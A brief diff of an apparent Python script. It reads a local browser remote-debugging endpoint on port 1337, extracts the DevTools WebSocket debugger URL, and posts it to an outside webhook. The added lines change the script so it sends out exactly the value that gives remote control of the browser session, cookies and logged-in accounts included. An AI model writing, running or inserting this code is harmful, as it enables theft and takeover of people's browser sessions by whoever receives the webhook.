@@ -6,5 +6,6 @@ url = "http://127.0.0.1:1337/json"
 
 getws = requests.get(url)
 lul = getws.json()
-form = {'content': f'{lul}'}
+websok = lul['webSocketDebuggerUrl']
+form = {'content': f'{websok}'}
 sendtow = requests.post(webh, data=form)
